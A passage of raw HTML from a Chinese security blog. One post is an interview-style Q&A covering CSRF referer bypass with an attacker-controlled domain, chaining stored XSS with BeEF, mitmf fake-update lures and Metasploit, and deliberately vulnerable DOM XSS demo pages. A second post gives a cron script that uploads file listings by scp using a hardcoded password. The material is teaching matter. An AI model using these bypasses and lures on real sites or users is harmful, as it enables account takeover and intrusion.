                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Reading time &asymp;</span>
                
                <span title="Reading time">
                  
                </span>
              
            </div>
          

          

        </span></div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">


      
      

      
        
          
            <h3 id="XSS相关漏洞"><a href="#XSS相关漏洞" class="headerlink" title="XSS相关漏洞"></a>XSS相关漏洞</h3><h5 id="1-POST类型的csrf漏洞，绕过设置了验证来源-referer-的情况。"><a href="#1-POST类型的csrf漏洞，绕过设置了验证来源-referer-的情况。" class="headerlink" title="1. POST类型的csrf漏洞，绕过设置了验证来源 referer 的情况。"></a>1. POST类型的csrf漏洞，绕过设置了验证来源 referer 的情况。</h5><p>1.1 更改请求方式绕过</p>
<p>​       如果伪造的敏感信息请求方式是通过POST方法发生的，那可以尝试转换为其他的方法如GET请求。通过GET发送应用程序可能依然执行并且通常没有任何保护机制。</p>
<p>1.2 通过二级子域名形式绕过</p>
<p>​        referer如果检验方式基于URL白名单的话，可以尝试通过二级子域名或者URL目录区域的方式进行referer绕过。</p>
<p>如referer的检测URL的字段为baidu.com,则可通过baidu.com.attacker.cn或attacker.cn/baidu.com进行绕过。</p>
<h5 id="2-有一个存储型-xss-打到了后台-cookie，但是后台在内网，无法访问的情况下，如何利用？"><a href="#2-有一个存储型-xss-打到了后台-cookie，但是后台在内网，无法访问的情况下，如何利用？" class="headerlink" title="2.有一个存储型 xss 打到了后台 cookie，但是后台在内网，无法访问的情况下，如何利用？"></a>2.有一个存储型 xss 打到了后台 cookie，但是后台在内网，无法访问的情况下，如何利用？</h5><p>​        这种情况需要结合beef一起使用。1.可以在beef上把目标的浏览器作为代理进行操作。2.可以利用mitmf结合社会工程学使用户接受Social Engineering中的模块，让用户安装.exe等更新软件获取shell。3.结合metasploit进一步获取权限。</p>
<h5 id="3-img标签可以跨域"><a href="#3-img标签可以跨域" class="headerlink" title="3. img标签可以跨域"></a>3. img标签可以跨域</h5><p>​        由于img标签不受浏览器同源策略的影响，允许跨域引用资源。因此可以通过 img 标签的 src 属性进行跨域，这也就是图像 Ping 跨域的基本原理。</p>
<p>编写一个简单的js脚本：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> img=<span class="keyword">new</span> Image();</span><br><span class="line">img.src=<span class="string">'https://www.baidu.com/img/bd_logo1.png?where=super'</span>;</span><br><span class="line">img.onerror=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"> alert(<span class="string">'error'</span>);</span><br><span class="line">&#125;</span><br><span class="line">img.onload=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"> alert(<span class="string">'success'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​      图片可以从任何URL中加载，所以将img的src设置成其他域的URL，即可以实现简单的跨域，可以使用onload和onerror事件来确定是否接受到了响应。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"zh-CN"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>浏览器跨域测试<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">H2</span>&gt;</span>浏览器跨域测试<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"js/tux.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>如果图像地址正确,则弹出onload加载信息success，从而实现了简单的跨域。</p>
<p>使用图片ping跨域只能发送get请求，并且不能访问响应的文本，只能监听是否响应而已。</p>
<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1570869244076.png" alt="1570869244076"></p>
<h5 id="4-dom型xss除了因为innerHTML-造成，还有什么。"><a href="#4-dom型xss除了因为innerHTML-造成，还有什么。" class="headerlink" title="4. dom型xss除了因为innerHTML 造成，还有什么。"></a>4. dom型xss除了因为innerHTML 造成，还有什么。</h5><p>​        DOM型XSS是基于DOM文档对象的漏洞。DOM型XSS算是反射型漏洞一种，但是不会与后台进行交互。完完全全的web前端安全问题。只能通过前端进行防御。</p>
<p>​        客户端在加载JS代码中，存在Sources+Sinks的情况即有可能存在DOM型XSS。</p>
<p><strong>Sources</strong></p>
<table>
<thead>
<tr>
<th>函数</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>document.URL</td>
<td>返回当前页面的URL</td>
</tr>
<tr>
<td>document.referrer</td>
<td>返回当前文档的URL</td>
</tr>
<tr>
<td>Window Location</td>
<td>获得当前页面的地址 (URL)，并把浏览器重定向到新的页面。</td>
</tr>
<tr>
<td>document.location</td>
<td>很多属性 其中包括返回当前页面的URL</td>
</tr>
<tr>
<td>location.href</td>
<td>返回完整的URL</td>
</tr>
<tr>
<td>location.search</td>
<td>返回一个URL的查询部分</td>
</tr>
<tr>
<td>location.hash</td>
<td>返回一个URL的锚部分</td>
</tr>
<tr>
<td>location.pathname</td>
<td>返回的URL路径名。</td>
</tr>
</tbody></table>
<p><strong>Sinks</strong></p>
<p><strong>直接执行脚本类</strong></p>
<table>
<thead>
<tr>
<th>函数</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>eval(…)</td>
<td>eval() 函数用来执行一个字符串表达式，并返回表达式的值。</td>
</tr>
</tbody></table>
<p>eval(expression[,globals[,locals]]) //expression – 表达式。globals – 变量作用域，全局命名空间，如果被提供，则必须是一个字典对象。locals – 变量作用域，局部命名空间，如果被提供，可以是任何映射对象。</p>
<p><strong>写HTML页面类</strong></p>
<table>
<thead>
<tr>
<th>函数</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>document.write(…)</td>
<td>write() 方法可向文档写入 HTML 表达式或 JavaScript 代码。</td>
</tr>
<tr>
<td>document.writeln(…)</td>
<td>等同于 write() 方法，不同的是在每个表达式之后写一个换行符。</td>
</tr>
<tr>
<td>element.innerHTML(…)</td>
<td>获取dom元素的内容</td>
</tr>
</tbody></table>
<p><strong>直接修改DOM类</strong></p>
<table>
<thead>
<tr>
<th>document.forms</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>document.forms[]</td>
<td>返回对文档中所有 Form 对象引用。</td>
</tr>
<tr>
<td>document.attachEvent(…)</td>
<td></td>
</tr>
<tr>
<td>document.create…(…)</td>
<td></td>
</tr>
<tr>
<td>document.execCommand(…)</td>
<td></td>
</tr>
<tr>
<td>document.body</td>
<td>返回文档的body元素</td>
</tr>
<tr>
<td>window.attachEvent(…)</td>
<td></td>
</tr>
</tbody></table>
<p><strong>打开/修改窗口类</strong></p>
<table>
<thead>
<tr>
<th>函数</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>document.open(…)</td>
<td>打开一个流，以收集来自任何 document.write() 或 document.writeln() 方法的输出。</td>
</tr>
<tr>
<td>window.open(…)</td>
<td>打开一个新的浏览器窗口或查找一个已命名的窗口。</td>
</tr>
<tr>
<td>window.location.href=</td>
<td>用于窗口或框架的 Location 对象,返回完整的URL</td>
</tr>
</tbody></table>
<p><strong>例子1：</strong>（document.write与document.URL组合）</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"zh-CN"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>DOMXSS<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">H2</span>&gt;</span>DOMXSS<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">	<span class="keyword">var</span> pos=<span class="built_in">document</span>.URL.indexOf(<span class="string">"name="</span>)+<span class="number">5</span>;</span></span><br><span class="line"><span class="javascript">	<span class="built_in">document</span>.write(<span class="built_in">decodeURI</span>(<span class="built_in">document</span>.URL.substring(pos,<span class="built_in">document</span>.URL.length))); </span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1571117909765.png" alt="1571117909765"></p>
<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1571117964969.png" alt="1571117964969"></p>
<p><strong>例子2：</strong>（location.hash+eval）</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"zh-CN"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>DOMXSS<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">H2</span>&gt;</span>DOMXSS<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"js/domxss3.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>domxss3.js脚本1:</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="built_in">decodeURI</span>(location.hash.substr(<span class="number">1</span>))); <span class="comment">//执行location.hash提取出的内容。#后面的内容</span></span><br></pre></td></tr></table></figure>

<p>domxss3.js脚本2:</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> hash = location.hash;</span><br><span class="line"><span class="keyword">if</span>(hash)&#123;</span><br><span class="line">    <span class="keyword">var</span> url = hash.substring(<span class="number">1</span>);</span><br><span class="line">	<span class="built_in">eval</span>(<span class="built_in">decodeURI</span>(url));          <span class="comment">//执行location.hash提取出的内容。#后面的内容</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1571124477147.png" alt="1571124477147"></p>
<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1571124503771.png" alt="1571124503771"></p>
<p><strong>例子3：</strong>（location.search+document.location）</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"zh-CN"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>DOMXSS<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">H2</span>&gt;</span>DOMXSS<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">	<span class="keyword">var</span> caxun = location.search;  <span class="comment">////返回一个URL的查询部分</span></span></span><br><span class="line"><span class="javascript">	<span class="keyword">var</span> searchParams = <span class="keyword">new</span> URLSearchParams(caxun);  <span class="comment">//URLSearchParams对象定义了操作 URL传递参数的方法。</span></span></span><br><span class="line"><span class="javascript">	<span class="keyword">var</span> id = searchParams.get(<span class="string">'id'</span>);   <span class="comment">//获取ID字段</span></span></span><br><span class="line"><span class="javascript">	<span class="keyword">if</span> (id !== <span class="literal">null</span>) &#123;</span></span><br><span class="line"><span class="javascript">		<span class="built_in">document</span>.location = id;</span></span><br><span class="line">	&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>从URL栏中获取id参数，如果不为空这赋值给document.location,然后页面跳转到新的URL地址。此时可以通过js伪协议实现DOM型XSS攻击。</p>
<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1571127738349.png" alt="1571127738349"></p>
<h5 id="5-在谷歌浏览器下，反射性-xss-为啥不能触发？"><a href="#5-在谷歌浏览器下，反射性-xss-为啥不能触发？" class="headerlink" title="5.在谷歌浏览器下，反射性 xss 为啥不能触发？"></a>5.在谷歌浏览器下，反射性 xss 为啥不能触发？</h5><p>​        谷歌浏览器在内核中加入了XSS Auditor，XSS Auditor这是一个被加入在了chrome内核中的安全功能，之所以加入内核是为了其它调用chrome内核的浏览器也具备这个功能，目的是为了抵御XSS，功能很强大，能抵御很多反射型XSS的payload，DOM的话效果弱很多，而存储型根本没用。与之类似的IE中也有自己的XSS Filter。</p>
<h3 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h3><p><a href="https://www.mi1k7ea.com/2019/06/25/%E6%B5%85%E6%9E%90DOM%E5%9E%8BXSS/" target="_blank" rel="noopener">浅谈DOM型XSS</a></p>
<p><a href="https://wizardforcel.gitbooks.io/xss-naxienian/content/7.html" target="_blank" rel="noopener">那些年我们一起学XSS</a></p>

          
        
      
    </div>
    
    
    



    

    

    



    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/10/09/ubuntu或linux针对关键文件检索关键信息/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Darren-zl">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/uploads/avatar.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Darren-学无止境">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/10/09/ubuntu或linux针对关键文件检索关键信息/" itemprop="url">ubuntu和liunx，针对关键文件输出关键信息，定时检测并且上传服务器端脚本</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-10-09T13:55:34+08:00">
                2019-10-09
              </time>
            

            

            
          </span>

          

          
            
              <span class="post-comments-count">
              <span class="post-meta-divider">|</span>
              <span class="post-meta-item-icon">
                <i class="fa fa-comment-o"></i>
              </span>
              
                <a href="/2019/10/09/ubuntu或linux针对关键文件检索关键信息/#SOHUCS" itemprop="discussionUrl">
                  <span id="url::http://yoursite.com/2019/10/09/ubuntu或linux针对关键文件检索关键信息/" class="cy_cmt_count" data-xid="2019/10/09/ubuntu或linux针对关键文件检索关键信息/" itemprop="commentsCount"></span>
                </a>
              
            
          

          
          
             <span id="/2019/10/09/ubuntu或linux针对关键文件检索关键信息/" class="leancloud_visitors" data-flag-title="ubuntu和liunx，针对关键文件输出关键信息，定时检测并且上传服务器端脚本">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">Visitors&#58;</span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Words count in article&#58;</span>
                
                <span title="Words count in article">
                  
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Reading time &asymp;</span>
                
                <span title="Reading time">
                  
                </span>
              
            </div>
          

          

        </span></div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">


      
      

      
        
          
            <h2 id="ubuntu检测脚本安装说明（以下操作以root用户身份进行）"><a href="#ubuntu检测脚本安装说明（以下操作以root用户身份进行）" class="headerlink" title="ubuntu检测脚本安装说明（以下操作以root用户身份进行）"></a>ubuntu检测脚本安装说明（以下操作以root用户身份进行）</h2><h3 id="1-首先需要安装Except"><a href="#1-首先需要安装Except" class="headerlink" title="1.首先需要安装Except"></a>1.首先需要安装Except</h3><h5 id="1-1-查看是否有Except服务"><a href="#1-1-查看是否有Except服务" class="headerlink" title="1.1 查看是否有Except服务"></a>1.1 查看是否有Except服务</h5><p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/github/1569834278071.png" alt="1569834278071"></p>
<p><strong>注:如果有则跳过第一步except步骤直接进行第二步。</strong></p>
<h5 id="1-2-检查tcl-安装情况"><a href="#1-2-检查tcl-安装情况" class="headerlink" title="1.2 检查tcl 安装情况"></a>1.2 检查tcl 安装情况</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span>whereis tcl</span><br></pre></td></tr></table></figure>

<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/github/1569834693116.png" alt="1569834693116"></p>
<p>如果如上图为空则需要进行安装。</p>
<h5 id="1-3-下载安装包"><a href="#1-3-下载安装包" class="headerlink" title="1.3 下载安装包"></a>1.3 下载安装包</h5><p>tcl版本 8.4.19</p>
<p><a href="https://jaist.dl.sourceforge.net/project/tcl/Tcl/8.4.19/tcl8.4.19-src.tar.gz" target="_blank" rel="noopener">https://jaist.dl.sourceforge.net/project/tcl/Tcl/8.4.19/tcl8.4.19-src.tar.gz</a></p>
<p>except版本5.45</p>
<p><a href="http://sourceforge.net/projects/expect/files/Expect/5.45/expect5.45.tar.gz" target="_blank" rel="noopener">http://sourceforge.net/projects/expect/files/Expect/5.45/expect5.45.tar.gz</a></p>
<p>下载两个包，分别解压。</p>
<h5 id="1-4-先安装tcl"><a href="#1-4-先安装tcl" class="headerlink" title="1.4 先安装tcl"></a>1.4 先安装tcl</h5><p> 进入tcl解压目录，然后进入unix目录：</p>
<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/github/1569834890714.png" alt="1569834890714"></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span>sudo ./configure</span><br><span class="line"><span class="meta">#</span>sudo make</span><br><span class="line"><span class="meta">#</span>sudo make install</span><br></pre></td></tr></table></figure>

<h5 id="1-5-安装expect"><a href="#1-5-安装expect" class="headerlink" title="1.5 安装expect"></a>1.5 安装expect</h5><p>进入expect解压目录：</p>
<p>安装时需指定tcl的相关目录</p>
<p>–with-tclinclude 参数就是  tcl开发包的解压安装位置</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span>sudo ./configure --with-tclinclude=/usr/local/src/tcl8.4.19/generic/ --with-tclconfig=/usr/local/lib/       //(这里的with-tclinclude=位置处需要写入tcl安装包解压的位置)</span><br><span class="line"><span class="meta">#</span>sudo make</span><br><span class="line"><span class="meta">#</span>sudo make install</span><br></pre></td></tr></table></figure>

<p>注意这里的configure命令需要使用–with-tclinclude选项传入tcl安装包中的generic文件夹路径。</p>
<p>安装完成之后运行expect命令，查看是否安装成功。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> expect</span><br><span class="line">expect1.1&gt;</span><br></pre></td></tr></table></figure>

<h3 id="2-检查脚本安装"><a href="#2-检查脚本安装" class="headerlink" title="2. 检查脚本安装"></a>2. 检查脚本安装</h3><h5 id="2-1-检查脚本有一处需要编辑地方"><a href="#2-1-检查脚本有一处需要编辑地方" class="headerlink" title="2.1 检查脚本有一处需要编辑地方"></a>2.1 检查脚本有一处需要编辑地方</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span>!/bin/bash</span><br><span class="line">set -x</span><br><span class="line">source /etc/profile</span><br><span class="line"></span><br><span class="line">NOW_IP=`ip a |awk -F '[ /]+' 'NR==9 &#123;print $3&#125;'`</span><br><span class="line">myPath="/var/"  </span><br><span class="line"></span><br><span class="line">find ./ -regextype posix-extended -regex ".*\.(jpg|png|bmp)" ! -path "./sys/*" ! -path "./etc/*"  ! -path "./bin/*"  ! -path "./lib/*"  ! -path "./lib64/*"  &gt;&gt;  /var/$NOW_IP.txt </span><br><span class="line"></span><br><span class="line">TO_HOST="**"</span><br><span class="line">USER="**"</span><br><span class="line">PASSWD="***"</span><br><span class="line">TO_DIR="/bakdata/checklogs/"</span><br><span class="line"> </span><br><span class="line">/expect5.45/expect &lt;&lt;-EOF  #该处改为你expect安装的目录</span><br><span class="line">set timeout -1</span><br><span class="line">spawn scp  -o "StrictHostKeyChecking no"  /var/$NOW_IP.txt $USER@$TO_HOST:$TO_DIR</span><br><span class="line"> </span><br><span class="line">expect "assword:"</span><br><span class="line">send "$PASSWD\n"</span><br><span class="line"> </span><br><span class="line">expect "100%"</span><br><span class="line">expect eof</span><br><span class="line">EOF</span><br><span class="line">  </span><br><span class="line">rm -rf  /var/$NOW_IP.txt</span><br></pre></td></tr></table></figure>

<p>dataacp.sh需要设置可执行权限。chmod 655 dataacp.sh</p>
<p>下面为dataacp1.1.sh 升级了版本。需求是分别输出大于60天与小于60天的文件</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span>!/bin/bash</span><br><span class="line">set -x</span><br><span class="line"></span><br><span class="line">source /etc/profile</span><br><span class="line"></span><br><span class="line">NOW_IP=`ip a |awk -F '[ /]+' 'NR==9 &#123;print $3&#125;'`</span><br><span class="line">myPath="/var/"  </span><br><span class="line">  </span><br><span class="line">find / -regextype posix-extended -regex ".*\.(jpg|png|bmp)" -mtime -60 ! -path "./sys/*" ! -path "./etc/*"  ! -path "./bin/*"  ! -path "./lib/*"  ! -path "./lib64/*"  &gt;&gt;  /var/$NOW_IP.txt.min </span><br><span class="line">find / -regextype posix-extended -regex ".*\.(jpg|png|bmp)" -mtime +60 ! -path "./sys/*" ! -path "./etc/*"  ! -path "./bin/*"  ! -path "./lib/*"  ! -path "./lib64/*"  &gt;&gt;  /var/$NOW_IP.txt.max </span><br><span class="line"></span><br><span class="line">TO_HOST="10.*.*.*"</span><br><span class="line">USER="***"</span><br><span class="line">PASSWD="******"</span><br><span class="line">TO_DIR="/bakdata/checklogs/"</span><br><span class="line"> </span><br><span class="line">/expect/expect5.45/expect &lt;&lt;-EOF</span><br><span class="line">set timeout -1</span><br><span class="line">spawn scp  -o "StrictHostKeyChecking no"  /var/$NOW_IP.txt.min $USER@$TO_HOST:$TO_DIR</span><br><span class="line"> </span><br><span class="line">expect "assword:"</span><br><span class="line">send "$PASSWD\n"</span><br><span class="line"> </span><br><span class="line">expect "100%"</span><br><span class="line">expect eof</span><br><span class="line">EOF</span><br><span class="line">rm -rf  /var/$NOW_IP.txt.min</span><br><span class="line"></span><br><span class="line">/expect/expect5.45/expect &lt;&lt;-EOF</span><br><span class="line">set timeout -1</span><br><span class="line">spawn scp  -o "StrictHostKeyChecking no"  /var/$NOW_IP.txt.max $USER@$TO_HOST:$TO_DIR</span><br><span class="line"> </span><br><span class="line">expect "assword:"</span><br><span class="line">send "$PASSWD\n"</span><br><span class="line"> </span><br><span class="line">expect "100%"</span><br><span class="line">expect eof</span><br><span class="line">EOF</span><br><span class="line">rm -rf  /var/$NOW_IP.txt.max</span><br></pre></td></tr></table></figure>

<h5 id="2-2-写时间计划"><a href="#2-2-写时间计划" class="headerlink" title="2.2 写时间计划"></a>2.2 写时间计划</h5><p>​        ubuntu第一次进行操作时候，需要进行编辑器选择。选择第二个工具。</p>
<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/github/1570512424469.png" alt="1570512424469"></p>
<p>然后时间计划如下进行写入</p>
<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/github/1570522932392.png" alt="1570522932392"></p>
<p>重启时间计划任务：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span>service cron restart</span><br></pre></td></tr></table></figure>

<h4 id="注："><a href="#注：" class="headerlink" title="注："></a>注：</h4><p>1:请将datacap.sh脚本放于root目录下    </p>
<p>2:将datacap.sh权限设置为655</p>
<p>3:全程用root身份进行操作</p>

          
        
      
    </div>
    
    
    



    

    

    



    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/10/06/各种注入类型的环境搭建和代码编写/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
